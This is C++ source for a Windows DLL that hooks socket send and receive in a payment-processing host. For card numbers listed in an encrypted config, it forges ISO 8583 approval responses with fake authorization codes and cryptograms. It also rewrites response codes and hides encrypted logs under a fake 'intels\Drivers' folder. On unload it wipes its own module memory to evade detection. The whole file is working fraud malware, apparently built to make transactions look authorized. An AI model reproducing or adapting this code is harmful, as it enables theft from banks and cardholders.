#include <iostream>
#include <thread>
#include <mutex>
#include <windows.h>
#include <detours.h>
#include <iso8583.h>
#include <fstream>
#include <string>
#include <unordered_map>
#include <arpa/inet.h>
#include <iomanip>
#include <ctime>
#include <chrono>
#include <sstream>
#include <direct.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <atomic>
#include <vector>
#include <cstring>
#include <map>
#include <memory>

std::mutex sendMutex;
std::mutex recvMutex;
std::mutex dataMapMutex;
std::mutex globalMutex;
std::mutex errlog;
std::atomic<bool> check(false);
const unsigned char FIXED_AES_KEY[] = "Iw2M4P670YaZcdef";
const unsigned char IV[] = {0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55};
const unsigned char XOR_KEY = 0xAA;
int (WINAPI *real_send)(SOCKET s, const char* buf, int len, int flags) = send;
int (WINAPI *real_recv)(SOCKET s, char* buf, int len, int flags) = recv;
std::unordered_map<std::string, std::string> infoMap;
std::unordered_map<std::string, std::string> blkMap;
std::string globalIP;
unsigned short globalPort;

std::string getCurrentTimeFormatted() {
    auto currentTime = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    std::stringstream ss;
    ss << "[" << std::put_time(std::localtime(&currentTime), "%Y-%m-%d %H:%M:%S") << "]";
    return ss.str();
}

void writeOp(const std::string& logEntry) {
    try {
        std::ofstream logFile("C:\\intels\\Drivers\\spvmdl.dat", std::ios::app);
        if (logFile.is_open()) {
            logFile << logEntry << std::endl;
            logFile.close();
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception in writeOp: " << e.what() << std::endl;
    }
}

void writeToLog(const std::string& logEntry) {
    try {
        auto currentTime = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
        std::stringstream ss;
        ss << "[" << std::put_time(std::localtime(&currentTime), "%Y-%m-%d %H:%M:%S") << "."
           << std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count() % 1000 << "]";
        DWORD pid = GetCurrentProcessId();
        ss << "[PID:" << pid << "]";
        DWORD tid = GetCurrentThreadId();
        ss << "[TID:" << tid << "] ";
        ss << logEntry;
        std::ofstream logFile("C:\\intels\\Drivers\\err_" + std::to_string(pid) + ".dat", std::ios::app);
        if (logFile.is_open()) {
            logFile << ss.str() << std::endl;
            logFile.close();
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception in writeToLog: " << e.what() << std::endl;
    }
}

void sendwrite(const std::string& messageType, const DL_UINT8* detail, DL_UINT16 len) {
    try {
        DWORD pid = GetCurrentProcessId();
        DWORD tid = GetCurrentThreadId();
        std::ofstream logFile("C:\\intels\\Drivers\\TMPS" + std::to_string(pid) + ".dat", std::ios::app);
        if (logFile.is_open()) {
            std::stringstream entry;
            entry << getCurrentTimeFormatted() << "[PID:" << pid << "][TID:" << tid << "] " << messageType << " Entry: '";
            for (DL_UINT16 i = 0; i < len; ++i) {
                entry << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(detail[i]);
            }
            entry << "'";
            logFile << entry.str() << std::endl;
            logFile.close();
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception in sendwrite: " << e.what() << std::endl;
    }
}

void recvwrite(const std::string& messageType, const DL_UINT8* detail, DL_UINT16 len) {
    try {
        DWORD pid = GetCurrentProcessId();
        DWORD tid = GetCurrentThreadId();
        std::ofstream logFile("C:\\intels\\Drivers\\TMPR" + std::to_string(pid) + ".dat", std::ios::app);
        if (logFile.is_open()) {
            std::stringstream entry;
            entry << getCurrentTimeFormatted() << "[PID:" << pid << "][TID:" << tid << "] " << messageType << " Entry: '";
            for (DL_UINT16 i = 0; i < len; ++i) {
                entry << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(detail[i]);
            }
            entry << "'";
            logFile << entry.str() << std::endl;
            logFile.close();
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception in recvwrite: " << e.what() << std::endl;
    }
}

void Jackpot(const std::string& logEntry) {
    try {
        auto currentTime = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
        std::stringstream ss;
        ss << "[" << std::put_time(std::localtime(&currentTime), "%Y-%m-%d %H:%M:%S") << "."
           << std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count() % 1000 << "]";
        DWORD pid = GetCurrentProcessId();
        ss << "[PID:" << pid << "]";
        DWORD tid = GetCurrentThreadId();
        ss << "[TID:" << tid << "] ";
        ss << logEntry;
        std::ofstream logFile("C:\\intels\\Drivers\\spv" + std::to_string(pid) + ".dat", std::ios::app);
        if (logFile.is_open()) {
            logFile << ss.str() << std::endl;
            logFile.close();
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception in Jackpot: " << e.what() << std::endl;
    }
}

void encryptAndWriteToFile(const std::string& input, const std::string& outputFile) {
    try {
        AES_KEY aesKeyStruct;
        AES_set_encrypt_key(FIXED_AES_KEY, 128, &aesKeyStruct);
        std::string paddedInput = input;
        int padding = AES_BLOCK_SIZE - (input.size() % AES_BLOCK_SIZE);
        paddedInput.append(padding, static_cast<char>(padding));
        std::vector<unsigned char> encryptedBuffer(paddedInput.size());
        unsigned char iv[AES_BLOCK_SIZE];
        std::memcpy(iv, IV, AES_BLOCK_SIZE);
        AES_cbc_encrypt(reinterpret_cast<const unsigned char*>(paddedInput.c_str()), encryptedBuffer.data(), paddedInput.size(), &aesKeyStruct, iv, AES_ENCRYPT);
        for (size_t i = 0; i < encryptedBuffer.size(); ++i) {
            encryptedBuffer[i] ^= XOR_KEY;
        }
        std::ofstream outFile(outputFile, std::ios::binary | std::ios::app);
        if (outFile.is_open()) {
            outFile.write(reinterpret_cast<const char*>(encryptedBuffer.data()), encryptedBuffer.size());
            outFile.close();
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception in encryptAndWriteToFile: " << e.what() << std::endl;
    }
}

void JackpotD(const std::string& messageType, const DL_UINT8* detail, DL_UINT16 len) {
    try {
        DWORD pid = GetCurrentProcessId();
        DWORD tid = GetCurrentThreadId();
        std::stringstream entry;
        entry << getCurrentTimeFormatted() << "[PID:" << pid << "][TID:" << tid << "] " << messageType << " Entry: '";
        for (DL_UINT16 i = 0; i < len; ++i) {
            entry << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(detail[i]);
        }
        entry << "'";
        std::string message = entry.str();
        encryptAndWriteToFile(message, "C:\\intels\\Drivers\\spc" + std::to_string(pid) + ".dat");
    } catch (const std::exception& e) {
        std::cerr << "Exception in JackpotD: " << e.what() << std::endl;
    }
}

void overwriteMemory() {
    try {
        HMODULE moduleHandle = GetModuleHandle(NULL);
        if (moduleHandle != NULL) {
            LPBYTE baseAddress = reinterpret_cast<LPBYTE>(moduleHandle);
            const int sizeToOverwrite = 1024;
            DWORD oldProtect;
            if (VirtualProtect(baseAddress, sizeToOverwrite, PAGE_READWRITE, &oldProtect)) {
                memset(baseAddress, 0, sizeToOverwrite);
                VirtualProtect(baseAddress, sizeToOverwrite, oldProtect, &oldProtect);
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception in overwriteMemory: " << e.what() << std::endl;
    }
}

void applyXOR(unsigned char* data, int len) {
    for (int i = 0; i < len; ++i) {
        data[i] ^= XOR_KEY;
    }
}

std::string decryptAES(const std::string& cipherText) {
    try {
        AES_KEY decryptKey;
        AES_set_decrypt_key(FIXED_AES_KEY, 128, &decryptKey);
        std::vector<unsigned char> plainText(cipherText.size());
        std::memcpy(plainText.data(), cipherText.data(), cipherText.size());
        applyXOR(plainText.data(), plainText.size());
        unsigned char iv[AES_BLOCK_SIZE];
        std::memcpy(iv, IV, AES_BLOCK_SIZE);
        AES_cbc_encrypt(plainText.data(), plainText.data(), cipherText.size(), &decryptKey, iv, AES_DECRYPT);
        return std::string(reinterpret_cast<char*>(plainText.data()), plainText.size());
    } catch (const std::exception& e) {
        std::cerr << "Exception in decryptAES: " << e.what() << std::endl;
        return {};
    }
}

std::map<std::string, std::map<std::string, std::string>> loadEncryptedConfig(const std::string& filename) {
    std::map<std::string, std::map<std::string, std::string>> config;
    try {
        std::ifstream file(filename);
        if (!file.is_open()) {
            return config;
        }
        std::string line, section;
        while (std::getline(file, line)) {
            if (line.empty() || line[0] == ';' || line[0] == '#') {
                continue;
            }
            if (line[0] == '[' && line.back() == ']') {
                section = line.substr(1, line.size() - 2);
            } else {
                std::string decryptedLine = decryptAES(line);
                size_t delimiter = decryptedLine.find('=');
                if (delimiter != std::string::npos) {
                    std::string key = decryptedLine.substr(0, delimiter);
                    std::string value = decryptedLine.substr(delimiter + 1);
                    config[section][key] = value;
                }
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception in loadEncryptedConfig: " << e.what() << std::endl;
    }
    return config;
}

void splitConfig(const std::map<std::string, std::map<std::string, std::string>>& config,
                 std::unordered_map<std::string, std::string>& map1,
                 std::unordered_map<std::string, std::string>& map2) {
    for (const auto& [section, values] : config) {
        if (section == "info") {
            for (const auto& [key, value] : values) {
                map1[key] = value;
            }
        } else if (section == "blk") {
            for (const auto& [key, value] : values) {
                map2[key] = value;
            }
        }
    }
}

void checkPan(SOCKET s, DL_UINT8* recvBuf, DL_UINT16 recvSize) {
    if (recvSize < 10 || recvBuf[0] != '\x60') {
        check.store(true);
        return;
    }

    DL_ISO8583_HANDLER isoHandler;
    DL_ISO8583_MSG isoMsg;
    DL_ISO8583_DEFS_1993_GetHandler(&isoHandler);
    if (DL_ISO8583_MSG_Init(&isoHandler, &isoMsg) != DL_ISO8583_MSG_OK) {
        check.store(true);
        return;
    }

    if (DL_ISO8583_MSG_Unpack(&isoHandler, recvBuf, recvSize, &isoMsg) != DL_ISO8583_MSG_OK) {
        DL_ISO8583_MSG_Free(&isoMsg);
        check.store(true);
        return;
    }

    logIncomingTraffic(s, recvBuf, recvSize);

    DL_ISO8583_STRING mti;
    DL_ISO8583_STRING processingCode;
    DL_ISO8583_STRING reservedNational3;
    DL_ISO8583_STRING responseCode;
    DL_ISO8583_STRING pan;
    DL_ISO8583_STRING iccData;
    DL_ISO8583_MSG_GetField_Str(0, &mti, &isoMsg);
    DL_ISO8583_MSG_GetField_Str(3, &processingCode, &isoMsg);
    DL_ISO8583_MSG_GetField_Str(62, &reservedNational3, &isoMsg);
    DL_ISO8583_MSG_GetField_Str(39, &responseCode, &isoMsg);
    DL_ISO8583_MSG_GetField_Str(2, &pan, &isoMsg);
    DL_ISO8583_MSG_GetField_Str(55, &iccData, &isoMsg);

    std::string panValue(reinterpret_cast<const char*>(pan.ptr), pan.len);

    std::lock_guard<std::mutex> lock(dataMapMutex);
    auto panIter = infoMap.find(panValue);
    if (panIter != infoMap.end()) {
        if (strncmp(reinterpret_cast<const char*>(mti.ptr), "0200", 4) == 0) {
            DL_ISO8583_STRING newMTI;
            newMTI.ptr = reinterpret_cast<const uint8_t*>("0210");
            newMTI.len = 4;
            DL_ISO8583_MSG_SetField_Str(0, &newMTI, &isoMsg);

            std::string iccDataStr(reinterpret_cast<const char*>(iccData.ptr), iccData.len);
            std::string tagARQC = "9F26";
            size_t pos = iccDataStr.find(tagARQC);
            if (pos != std::string::npos) {
                size_t lengthPos = pos + tagARQC.size();
                uint8_t arqcLength = static_cast<uint8_t>(iccDataStr[lengthPos]);
                std::string arpcValue;
                if (arqcLength == 8) {
                    arpcValue = "4F2A8B7D";
                } else if (arqcLength == 16) {
                    arpcValue = "9D4F2A8B7D1E3C5F";
                }
                std::string newIccData = iccDataStr;
                std::string newARPC = "9F26" + static_cast<char>(arqcLength) + arpcValue;
                newIccData.replace(pos, tagARQC.size() + 1 + arqcLength, newARPC);
                DL_ISO8583_Field_t updatedField55;
                updatedField55.ptr = reinterpret_cast<const uint8_t*>(newIccData.c_str());
                updatedField55.len = newIccData.size();
                DL_ISO8583_MSG_SetField(55, &updatedField55, &isoMsg);
            }

            DL_ISO8583_STRING newResponseCode;
            newResponseCode.ptr = reinterpret_cast<const uint8_t*>("00");
            newResponseCode.len = 2;
            DL_ISO8583_MSG_SetField_Str(39, &newResponseCode, &isoMsg);
        }

        if (strncmp(reinterpret_cast<const char*>(mti.ptr), "0100", 4) == 0) {
            DL_ISO8583_STRING newMTI;
            newMTI.ptr = reinterpret_cast<const uint8_t*>("0110");
            newMTI.len = 4;
            DL_ISO8583_MSG_SetField_Str(0, &newMTI, &isoMsg);

            DL_ISO8583_STRING authorizationCode;
            authorizationCode.ptr = reinterpret_cast<const uint8_t*>("C1DEF9");
            authorizationCode.len = 6;
            DL_ISO8583_MSG_SetField_Str(38, &authorizationCode, &isoMsg);

            std::string iccDataStr(reinterpret_cast<const char*>(iccData.ptr), iccData.len);
            std::string tagARQC = "9F26";
            size_t pos = iccDataStr.find(tagARQC);
            if (pos != std::string::npos) {
                size_t lengthPos = pos + tagARQC.size();
                uint8_t arqcLength = static_cast<uint8_t>(iccDataStr[lengthPos]);
                std::string arpcValue;
                if (arqcLength == 8) {
                    arpcValue = "4F2A8B7D";
                } else if (arqcLength == 16) {
                    arpcValue = "9D4F2A8B7D1E3C5F";
                }
                std::string newIccData = iccDataStr;
                std::string newARPC = "9F26" + static_cast<char>(arqcLength) + arpcValue;
                newIccData.replace(pos, tagARQC.size() + 1 + arqcLength, newARPC);
                DL_ISO8583_Field_t updatedField55;
                updatedField55.ptr = reinterpret_cast<const uint8_t*>(newIccData.c_str());
                updatedField55.len = newIccData.size();
                DL_ISO8583_MSG_SetField(55, &updatedField55, &isoMsg);
            }

            DL_ISO8583_STRING newResponseCode;
            newResponseCode.ptr = reinterpret_cast<const uint8_t*>("00");
            newResponseCode.len = 2;
            DL_ISO8583_MSG_SetField_Str(39, &newResponseCode, &isoMsg);
        }

        std::lock_guard<std::mutex> globalLock(globalMutex);
        sockaddr_in serv_addr = {};
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(globalPort);
        serv_addr.sin_addr.s_addr = inet_addr(globalIP.c_str());

        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            std::lock_guard<std::mutex> logLock(errlog);
            writeToLog("Error creating a socket");
            DL_ISO8583_MSG_Free(&isoMsg);
            return;
        }

        if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            close(sockfd);
            std::lock_guard<std::mutex> logLock(errlog);
            writeToLog("Server connection error");
            DL_ISO8583_MSG_Free(&isoMsg);
            return;
        }

        DL_UINT16 packedSize = 0;
        if (DL_ISO8583_MSG_Pack(&isoHandler, &isoMsg, (DL_UINT8*)recvBuf, &packedSize) != DL_ISO8583_MSG_OK) {
            close(sockfd);
            std::lock_guard<std::mutex> logLock(errlog);
            writeToLog("ISO 8583 message packing error");
            DL_ISO8583_MSG_Free(&isoMsg);
            return;
        }

        size_t totalSent = 0;
        while (totalSent < packedSize) {
            ssize_t sent = send(sockfd, recvBuf + totalSent, packedSize - totalSent, 0);
            if (sent == -1) {
                close(sockfd);
                std::lock_guard<std::mutex> logLock(errlog);
                writeToLog("Error sending data");
                DL_ISO8583_MSG_Free(&isoMsg);
                return;
            }
            totalSent += sent;
        }

        Jackpot("Jackpot");
        JackpotD("SEND", recvBuf, packedSize);
        close(sockfd);
        DL_ISO8583_MSG_Free(&isoMsg);
        return;
    }

    check.store(true);
    DL_ISO8583_MSG_Free(&isoMsg);
}

void checkSend(SOCKET s, DL_UINT8* sendBuf, DL_UINT16 sendSize) {
    if (sendSize < 10 || sendBuf[0] != '\x60') {
        return;
    }

    DL_ISO8583_HANDLER isoHandler;
    DL_ISO8583_MSG isoMsg;
    DL_ISO8583_DEFS_1993_GetHandler(&isoHandler);
    if (DL_ISO8583_MSG_Init(&isoHandler, &isoMsg) != DL_ISO8583_MSG_OK) {
        return;
    }

    if (DL_ISO8583_MSG_Unpack(&isoHandler, sendBuf, sendSize, &isoMsg) != DL_ISO8583_MSG_OK) {
        DL_ISO8583_MSG_Free(&isoMsg);
        return;
    }

    logOutgoingTraffic(s, sendBuf, sendSize);

    DL_ISO8583_STRING responseCode;
    if (DL_ISO8583_MSG_GetField_Str(39, &responseCode, &isoMsg) != DL_ISO8583_MSG_OK) {
        DL_ISO8583_MSG_Free(&isoMsg);
        return;
    }

    std::string responseCodeStr(reinterpret_cast<const char*>(responseCode.ptr), responseCode.len);
    std::lock_guard<std::mutex> lock(dataMapMutex);
    DL_ISO8583_STRING pan;
    if (DL_ISO8583_MSG_GetField_Str(2, &pan, &isoMsg) != DL_ISO8583_MSG_OK) {
        DL_ISO8583_MSG_Free(&isoMsg);
        return;
    }

    std::string panValue(reinterpret_cast<const char*>(pan.ptr), pan.len);
    auto panIter = infoMap.find(panValue);
    if (panIter != infoMap.end()) {
        auto blkIter = blkMap.find(responseCodeStr);
        if (blkIter != blkMap.end()) {
            responseCodeStr = "51";
            DL_ISO8583_STRING newResponseCode;
            newResponseCode.ptr = reinterpret_cast<const uint8_t*>(responseCodeStr.c_str());
            newResponseCode.len = responseCodeStr.length();
            DL_ISO8583_MSG_SetField_Str(39, &newResponseCode, &isoMsg);
            DL_UINT16 packedSize = sendSize;
            DL_ISO8583_MSG_Pack(&isoHandler, &isoMsg, sendBuf, &packedSize);
            hooked_send(s, reinterpret_cast<const char*>(sendBuf), packedSize, 0);
        }
    }

    DL_ISO8583_MSG_Free(&isoMsg);
}

void logIncomingTraffic(SOCKET s, DL_UINT8* buf, DL_UINT16 len) {
    sockaddr_in senderAddr;
    int senderAddrLen = sizeof(senderAddr);
    getpeername(s, (sockaddr*)&senderAddr, &senderAddrLen);
    std::lock_guard<std::mutex> lock(globalMutex);
    globalIP = inet_ntoa(senderAddr.sin_addr);
    globalPort = ntohs(senderAddr.sin_port);
    char filename[128];
    snprintf(filename, sizeof(filename), "C:\\intels\\Drivers\\TMPC_%s_%d.tmp", globalIP.c_str(), globalPort);
    std::ofstream file(filename, std::ios::app | std::ios::binary);
    if (file.is_open()) {
        file << "SEND SOCK= 0x" << s << ", BUF= 0x" << (void*)buf << ", LEN= 0x" << std::setw(8) << std::setfill('0') << len << ", IP= " << globalIP << ", Port= " << globalPort << std::endl;
        file.close();
    }
}

void logOutgoingTraffic(SOCKET s, DL_UINT8* buf, DL_UINT16 len) {
    sockaddr_in senderAddr;
    int senderAddrLen = sizeof(senderAddr);
    getpeername(s, (sockaddr*)&senderAddr, &senderAddrLen);
    std::lock_guard<std::mutex> lock(globalMutex);
    std::string ipStr = inet_ntoa(senderAddr.sin_addr);
    uint16_t port = ntohs(senderAddr.sin_port);
    char filename[128];
    snprintf(filename, sizeof(filename), "C:\\intels\\Drivers\\TMPG_%s_%d.tmp", ipStr.c_str(), port);
    std::ofstream file(filename, std::ios::app | std::ios::binary);
    if (file.is_open()) {
        file << "SEND SOCK= 0x" << s << ", BUF= 0x" << (void*)buf << ", LEN= 0x" << std::setw(8) << std::setfill('0') << len << ", IP= " << ipStr << ", Port= " << port << std::endl;
        file.close();
    }
}

int WINAPI hooked_send(SOCKET s, const char* buf, int len, int flags) {
    std::lock_guard<std::mutex> lock(sendMutex);
    std::unique_ptr<uint8_t[]> sendBuf(new (std::nothrow) uint8_t[len]);
    if (!sendBuf) {
        return SOCKET_ERROR;
    }
    std::memcpy(sendBuf.get(), buf, len);
    DL_UINT16 sendSize = len;
    checkSend(s, sendBuf.get(), sendSize);
    sendwrite("SEND", sendBuf.get(), sendSize);
    return real_send(s, reinterpret_cast<const char*>(sendBuf.get()), sendSize, flags);
}

int WINAPI hooked_recv(SOCKET s, char* buf, int len, int flags) {
    std::lock_guard<std::mutex> lock(recvMutex);
    int ret = real_recv(s, buf, len, flags);
    if (ret <= 0) {
        return ret;
    }
    std::unique_ptr<uint8_t[]> recvBuf(new (std::nothrow) uint8_t[len]);
    if (!recvBuf) {
        return SOCKET_ERROR;
    }
    std::memcpy(recvBuf.get(), buf, len);
    DL_UINT16 recvSize = len;
    checkPan(s, recvBuf.get(), recvSize);
    if (check.load()) {
        check.store(false);
        recvwrite("RECV", recvBuf.get(), recvSize);
        return ret;
    } else {
        return 0;
    }
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {
    if (DetourIsHelperProcess()) {
        return TRUE;
    }
    if (dwReason == DLL_PROCESS_ATTACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        CreateDirectoryA("C:\\intels\\Drivers\\", NULL);
        DetourAttach(&(PVOID&)real_send, hooked_send);
        DetourAttach(&(PVOID&)real_recv, hooked_recv);
        LONG error = DetourTransactionCommit();
        if (error == NO_ERROR) {
            writeOp("Zaebis");
        } else {
            writeOp("Pizdec");
        }
        auto config = loadEncryptedConfig("info.ini");
        splitConfig(config, infoMap, blkMap);
    } else if (dwReason == DLL_PROCESS_DETACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)real_send, hooked_send);
        DetourDetach(&(PVOID&)real_recv, hooked_recv);
        overwriteMemory();
        DetourTransactionCommit();
        writeOp("Oxyeno");
    }
    return TRUE;
}


   

